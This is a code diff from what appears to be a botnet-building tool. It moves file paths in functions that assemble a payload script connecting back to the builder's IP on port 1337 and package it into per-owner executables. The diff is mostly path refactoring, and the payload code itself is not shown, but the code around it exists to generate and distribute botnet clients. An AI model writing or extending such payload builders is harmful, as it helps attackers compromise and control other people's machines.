@@ -1,5 +1,4 @@
 import os
-from urllib.request import pathname2url
 import subprocess
 
 from botnet import utils
@@ -21,8 +20,8 @@ def _payload(owner, var=None):
     _payload = Payload(host='{utils.local_ip()}', port='1337', owner='{owner}')
     _payload.run()"""
     
-    payload = open("botnet/core/payload", 'r').read()
-    payload = '\n'.join([main, utils.payload])
+    payload = open("botnet/payload.py", 'r').read()
+    payload = '\n'.join([main, payload])
     
     if not os.path.isdir('botnet/payloads'):
         try:
@@ -45,9 +44,9 @@ def _executable(owner, var=None):
         utils.log(f"The script '{script_name}' does not exist.", level='error')
         exit(1)
 
-    build_dir = os.path.join('executables', owner, 'build')
-    spec_dir = os.path.join('executables', owner, 'spec')
-    output_dir = os.path.join('executables', owner, 'exe')
+    build_dir = os.path.join('botnet/executables', owner, 'build')
+    spec_dir = os.path.join('botnet/executables', owner, 'spec')
+    output_dir = os.path.join('botnet/executables', owner, 'exe')
 
     if not os.path.isdir(output_dir):
         try:
